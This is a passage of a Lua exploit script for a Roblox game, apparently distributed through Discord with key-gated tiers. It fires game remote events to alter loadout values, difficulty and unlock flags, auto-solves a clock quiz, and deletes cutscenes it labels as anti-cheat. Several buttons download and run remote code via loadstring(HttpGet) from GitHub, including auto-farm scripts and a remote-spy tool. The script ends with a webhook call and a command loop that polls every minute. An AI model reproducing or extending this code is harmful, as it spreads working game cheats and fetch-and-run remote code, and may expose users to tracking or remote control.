        Name = "Revert Bank",
        Callback = function()
            Notify("Notification!", "Reverted Bank To: " .. selectedrBank, 3, 4483362458)
            SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, Base.Cannon.Value, RbankID)
        end,
    })

    Secret:CreateKeybind({
       Name = "Revert Bank Keybind",
       CurrentKeybind = "Z",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
           Notify("Notification!", "Reverted Bank To: " .. selectedrBank, 3, 4483362458)
           SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, Base.Cannon.Value, RbankID)
       end,
    })

    local selectedCannon = "Default"
    local selectedrCannon = "Default"
    local cannonMap = {
        Default = 1,
        Gatling = 2,
        Slammer = 3,
        Recoil = 4,
        Treasure = 5,
        Absorber = 6,
        Liberty = 7
    }
    local cannonID = cannonMap[selectedCannon] or 1
    local RcannonID = cannonMap[selectedrCannon] or 1

    Secret:CreateDivider()

    Secret:CreateDropdown({
        Name = "Select Cannon",
        Options = {"Default", "Gatling", "Slammer", "Recoil", "Treasure", "Absorber", "Liberty"},
        CurrentOption = "Default",
        MultipleOptions = false,
        Flag = "Dropdown",
        Callback = function(Value)
            selectedCannon = Value[1]
            cannonID = cannonMap[selectedCannon] or 1
            Notify("Notification!", "Changed Cannon To: " .. selectedCannon, 3, 4483362458)
        end
    })

    Secret:CreateButton({
        Name = "Combine Cannon",
        Callback = function()
            Notify("Notification!", "Combined Cannon To: " .. selectedCannon, 3, 4483362458)
            SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, cannonID, Base.Bank.Value)
        end,
    })

    Secret:CreateKeybind({
       Name = "Combine Cannon Keybind",
       CurrentKeybind = "V",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
           Notify("Notification!", "Combined Cannon To: " .. selectedCannon, 3, 4483362458)
           SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, cannonID, Base.Bank.Value)
       end,
    })

    Secret:CreateDropdown({
        Name = "Select Reverted Cannon",
        Options = {"Default", "Gatling", "Slammer", "Recoil", "Treasure", "Absorber", "Liberty"},
        CurrentOption = "Default",
        MultipleOptions = false,
        Flag = "Dropdown",
        Callback = function(Value)
            selectedrCannon = Value[1]
            RcannonID = cannonMap[selectedrCannon] or 1
            Notify("Notification!", "Changed Cannon To: " .. selectedrCannon, 3, 4483362458)
        end
    })

    Secret:CreateButton({
        Name = "Revert Cannon",
        Callback = function()
            Notify("Notification!", "Combined Cannon To: " .. selectedrCannon, 3, 4483362458)
            SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, RcannonID, Base.Bank.Value)
        end,
    })

    Secret:CreateKeybind({
       Name = "Revert Cannon Keybind",
       CurrentKeybind = "C",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
           Notify("Notification!", "Combined Cannon To: " .. selectedrCannon, 3, 4483362458)
           SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, RcannonID, Base.Bank.Value)
       end,
    })

    Secret:CreateDivider()

    Secret:CreateButton({
        Name = "Correct Chronos Clock Quiz Time",
        Callback = function()
            Notification:Notify(
			    {Title = "Not Accurated", Description = "This script is not accurate but minutes hand is."},
		    	{OutlineColor = Color3.fromRGB(80, 80, 80), Time = 4, Type = "default"}
		    )
            runQuiz("time")
        end,
    })

    Secret:CreateKeybind({
       Name = "Correct Chronos Clock Quiz Time Keybind",
       CurrentKeybind = "L",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
           Notification:Notify(
			    {Title = "Not Accurated", Description = "This script is not accurate but minutes hand is."},
		    	{OutlineColor = Color3.fromRGB(80, 80, 80), Time = 4, Type = "default"}
		    )
            runQuiz("time")
       end,
    })

    Secret:CreateButton({
        Name = "Correct Chronos Clock Quiz Answer",
        Callback = function()
            runQuiz("answer")
        end,
    })

    Secret:CreateKeybind({
       Name = "Correct Chronos Clock Quiz Answer Keybind",
       CurrentKeybind = "I",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
            runQuiz("answer")
       end,
    })

    Secret:CreateButton({
        Name = "Correct Chronos Clock Quiz Click",
        Callback = function()
            runQuiz("click")
        end,
    })

    Secret:CreateKeybind({
       Name = "Correct Chronos Clock Quiz Click Keybind",
       CurrentKeybind = "U",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
            runQuiz("click")
       end,
    })

    Secret:CreateButton({
        Name = "Correct Chronos Clock Quiz Answer & Click",
        Callback = function()
            runQuiz("answerclick")
        end,
    })

    Secret:CreateKeybind({
       Name = "Correct Chronos Clock Quiz Answer & Click Keybind",
       CurrentKeybind = "J",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
            runQuiz("answerclick")
       end,
    })
end

Secret:CreateInput({
    Name = "Secret Key (found on Discord)",
    CurrentValue = "",
    PlaceholderText = "Input secret key",
    RemoveTextAfterFocusLost = false,
    Flag = "Input1",
    Callback = function(Text)
        tbbkey = Text
    end,
})

Secret:CreateButton({
    Name = "Confirm Key",
    Callback = function()
        if tbbkey == secretkey then
            loadAdmin()
            Notify("Valid Key!", "Welcome, Administrator!", 5, 4483362458)
            if not isfile("secretkey") or readkey1 ~= secretkey then
                if isfile("secretkey") then
                    delfile("secretkey")
                end
                writefile("secretkey", secretkey)
            end
            return
        elseif readkey1 == secretkey then
            loadAdmin()
            Notify("Valid Key!", "Welcome back, Administrator!", 5, 4483362458)
            return
        end
        
        if tbbkey == paidkey then
            loadPaid()
            Notify("Valid Key!", "Welcome, " .. Player .. " (" .. User .. ") !", 5, 4483362458)
            if not isfile("paidkey") or readkey3 ~= paidkey then
                if isfile("paidkey") then
                    delfile("paidkey")
                end
                writefile("paidkey", paidkey)
            end
            return
        elseif readkey3 == paidkey then
            loadPaid()
            Notify("Valid Key!", "Welcome back, " .. Player .. " (" .. User .. ") !", 5, 4483362458)
            return
        end
        
        if tbbkey == huntkey then
            loadKeyHunt()
            Notify("Valid Key!", "Congratulations on winning the key!", 5, 4483362458)
            if not isfile("huntkey") or readkey2 ~= huntkey then
                if isfile("huntkey") then
                    delfile("huntkey")
                end
                writefile("huntkey", huntkey)
            end
            return
        elseif readkey2 == huntkey then
            loadKeyHunt()
            Notify("Valid Key!", "Welcome back, Winner.", 5, 4483362458)
            return
        end

        if not tbbkey or tbbkey == "" then
            if isfile("tbb-key") then
                tbbkey = readfile("tbb-key")
            end
        end

        if readkey == key or tbbkey == key then
            if not isfile("tbb-key") or readkey ~= key then
                if isfile("tbb-key") then
                    delfile("tbb-key")
                end
                writefile("tbb-key", key)
            end
            loadNormalKey()
            Notify("Valid Key!", "Key you provided is corrected key.", 5, 4483362458)
        else
            Notify("Invalid Key!", "Please check the key you provided or get the latest key.", 5, 4483362458)
        end
    end,
})

local P = Window:CreateTab("Auto Farm", 4483345998)

P:CreateButton({
	Name = "Slow Auto Farm XP (Ch. 1 Stage 11)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/N0ne-ExIStenc3/repo/refs/heads/main/Farm1.txt"))()
	end,
})

P:CreateParagraph({Title = "Unlock Ch. 1 Stage 11.", Content = "To use this function put good dps on slot1!"})

P:CreateButton({
	Name = "Fast Auto Farm XP (Ch. 2 Stage 10)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/N0ne-ExIStenc3/repo/refs/heads/main/Farm2.txt"))()
	end,
})

P:CreateParagraph({Title = "Unlock Ch. 2 Stage 10.", Content = "To use this function put dual speed coils on slot1!"})

P:CreateButton({
	Name = "Fastest Auto Farm XP (Ch. 2 Stage 10 3 Stars)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/N0ne-ExIStenc3/repo/refs/heads/main/Farm3.txt"))()
	end,
})

P:CreateParagraph({Title = "Unlock Ch. 2 Stage 10 3 Stars.", Content = "To use this function put chairman on slot1 and use ignition!"})

local V = Window:CreateTab("Misc", 4483345998)

V:CreateButton({
    Name = "Change to Casual Difficulty",
    Callback = function()
        local args = {
            [1] = {
                [1] = { "Difficulty", 1 }
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("RemoteEvents"):WaitForChild("ChangeSettings"):FireServer(unpack(args))
    end,
})

V:CreateButton({
    Name = "Change to Normal Difficulty",
    Callback = function()
        local args = {
            [1] = {
                [1] = { "Difficulty", 2 }
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("RemoteEvents"):WaitForChild("ChangeSettings"):FireServer(unpack(args))
    end,
})

V:CreateButton({
    Name = "Change to Tumore Difficulty",
    Callback = function()
        local args = {
            [1] = {
                [1] = { "Difficulty", 3 },
                [2] = { "UnlockedTumore", 1 }
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("RemoteEvents"):WaitForChild("ChangeSettings"):FireServer(unpack(args))
    end,
})

V:CreateButton({
    Name = "Remove Possiblely Anti-Cheat Cutscenes",
    Callback = function()
        game:GetService("ReplicatedStorage").Cutscenes.TheresNothing:Destroy()
        game:GetService("ReplicatedStorage").Cutscenes.EyeOfRah:Destroy()
        game:GetService("ReplicatedStorage").Cutscenes.RaigQuit:Destroy()
        game:GetService("ReplicatedStorage").Cutscenes.ChangeYourTime:Destroy()
        -- YouCheated possibly on ServerStorage
    end,
})

local ostOptions = {}
for _, v in ipairs(game.SoundService.OST:GetChildren()) do
    table.insert(ostOptions, v.Name)
end

V:CreateDropdown({
    Name = "Select OST",
    Options = ostOptions,
    CurrentOption = "Default",
    MultipleOptions = false,
    Flag = "Dropdown",
    Callback = function(Value)
        selectedMusic = Value[1]
    end
})

V:CreateButton({
    Name = "Change OST",
    Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("BindableEvents"):WaitForChild("MusicChange"):Fire(selectedMusic)
    end,
})

local UI = Window:CreateTab("GUI", 4483345998)

UI:CreateDropdown({
    Name = "Select Menu",
    Options = { "Lobby", "Almanac", "Difficulty", "MainMenu", "MainChapter", "SubChapter", "Shop", "Loadout" },
    CurrentOption = "Default",
    MultipleOptions = false,
    Flag = "Dropdown",
    Callback = function(Value)
        selectedMenu = Value[1]
    end
})

UI:CreateButton({
    Name = "Change Menu",
    Callback = function()
        local event = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("BindableEvents"):WaitForChild("MenuSelect")
        event:Fire(selectedMenu)
    end,
})

UI:CreateButton({
    Name = "Clock Quiz (Based on selected stars)",
    Callback = function()
        local C = game:GetService("ReplicatedStorage").Cutscenes.ClockQuiz:Clone()
        C.Parent = game.Players.LocalPlayer.PlayerGui
    end,
})

UI:CreateButton({
    Name = "Chronos Intro",
    Callback = function()
        local C = game:GetService("ReplicatedStorage").Cutscenes.ChronosIntro:Clone()
        C.Parent = game.Players.LocalPlayer.PlayerGui
    end,
})

UI:CreateButton({
    Name = "Create Transition",
    Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("BindableEvents"):WaitForChild("Transition"):Fire()
    end,
})

UI:CreateInput({
   Name = "Camera Shake Value",
   CurrentValue = "10",
   PlaceholderText = "",
   RemoveTextAfterFocusLost = false,
   Flag = "Input",
   Callback = function(Text)
       CamShakeIntensity = tonumber(Text) or 10
   end,
})

UI:CreateButton({
    Name = "Trigger Camera Shake",
    Callback = function()
        local camShakeEvent = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("BindableEvents"):WaitForChild("CamShake")
        camShakeEvent:Fire(CamShakeIntensity)
    end
})

local S = Window:CreateTab("Scripts", 4483345998)

S:CreateButton({
    Name = "Dex Explorer",
    Callback = function()
        local success, result = pcall(loadstring, game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/refs/heads/main/dex.lua"))
        if success then 
            result() 
        else 
            warn("Failed to load Dex for PC.") 
        end
    end,
})

S:CreateButton({
    Name = "Octo Spy",
    Callback = function()
        local success, result = pcall(loadstring, game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Octo-Spy/refs/heads/main/Main.lua", true))
        if success then 
            result() 
        else 
            warn("Failed to load Octo Spy.") 
        end
    end,
})

S:CreateButton({
    Name = "Anti-Afk",
    Callback = function()
        local VirtualUser = game:GetService('VirtualUser')
 
        game:GetService('Players').LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
 
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Anti-AFK Loaded!",
            Text = "Cool!",
            Button1 = "Thanks",
            Duration = 5
        })
    end,
})

S:CreateButton({
    Name = "Random Song",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/N0ne-ExIStenc3/repo/refs/heads/main/c00ls0ngz.txt"))()
    end,
})

local RunService = game:GetService("RunService")
local barColor = Color3.fromRGB(0, 0, 255)
local renderConnection

local function loadBossHP()
	if workspace:WaitForChild("NPCFolders").BaseFolder:FindFirstChild("Blue Base") then
		if PlayerGui:FindFirstChild("BossHP") then
			PlayerGui.BossHP:Destroy()
			if renderConnection then renderConnection:Disconnect() end
		end
	end

	local screenGui = Instance.new("ScreenGui", PlayerGui)
	screenGui.Name = "BossHP"
	screenGui.ResetOnSpawn = false

	local template = workspace:WaitForChild("NPCFolders").BaseFolder["Blue Base"].FriendlyBase.Frame:Clone()
	template.Parent = screenGui
	template.Size = UDim2.new(0.7, 0, 0.1, 0)
	template.Position = UDim2.new(0.5, 0, 0.2, 0)
	template.AnchorPoint = Vector2.new(0.5, 0)
	template.Visible = false

	local bar = template:FindFirstChild("Bar")

	renderConnection = RunService.RenderStepped:Connect(function()
        if not screenGui or not screenGui.Parent then
            if renderConnection then renderConnection:Disconnect() end
            rainbowActive = false
            return
        end

        local bossFound = false

		for _, npc in ipairs(EnemyFolder:GetChildren()) do
            local isBoss = bosses[npc.Name]
            if isBoss and npc:FindFirstChild("Humanoid") then
                local hp = npc.Humanoid.Health
                local maxHp = npc.Humanoid.MaxHealth
                if hp > 0 then
                    bossFound = true
                    template.Visible = true
                    if bar then
                        bar.Size = UDim2.new(math.clamp(hp / maxHp, 0, 1), 0, 1, 0)
                        bar.BackgroundColor3 = barColor
                    end
                    if template:FindFirstChild("TextLabel") then
                        template.TextLabel.Text = npc.Name .. ": " .. math.floor(hp) .. "/" .. math.floor(maxHp)
                    end
                    break
                end
            end
        end

		if not bossFound then
			template.Visible = false
		end
	end)
end

local Ex = Window:CreateTab("Exclusive", 4483345998)

Ex:CreateButton({
	Name = "Default Blue Colors",
	Callback = function()
		barColor = Color3.fromRGB(0, 221, 255)
	end,
})

Ex:CreateButton({
	Name = "Default Green Colors",
	Callback = function()
		barColor = Color3.fromRGB(0, 221, 0)
	end,
})

Ex:CreateButton({
	Name = "Default Orange Colors",
	Callback = function()
		barColor = Color3.fromRGB(255, 183, 0)
	end,
})

Ex:CreateButton({
	Name = "Random Color",
	Callback = function()
		barColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
	end,
})

Ex:CreateButton({
	Name = "Boss's HP Bar (Use on boss stage)",
	Callback = function()
		loadBossHP()
	end,
})

Ex:CreateParagraph({Title = "More Settings.", Content = "Select your own design for bosses"})

Ex:CreateColorPicker({
	Name = "Pick Boss's HP Bar Color",
	Color = barColor,
	Flag = "ColorPicker1",
	Callback = function(Value)
		barColor = Value
	end
})

Ex:CreateToggle({
    Name = "Rainbow Bar Color",
    CurrentValue = false,
    Flag = "ToggleRainbow",
    Callback = function(Value)
        rainbowActive = Value
        if rainbowActive then
            task.spawn(function()
                local t = 0
                while rainbowActive do
                    t = t + 0.02
                    local r = math.sin(t) * 0.5 + 0.5
                    local g = math.sin(t + 2) * 0.5 + 0.5
                    local b = math.sin(t + 4) * 0.5 + 0.5
                    barColor = Color3.new(r, g, b)
                    task.wait()
                end
            end)
        end
    end,
})

Notify("Script Loaded!", "Enjoy!", 10, 4483362458)

checkBlacklist(player)

pcall(function()
    sendWebhook(payload)
end)

runCommands()

while true do
	task.wait(60)
	runCommands()
end
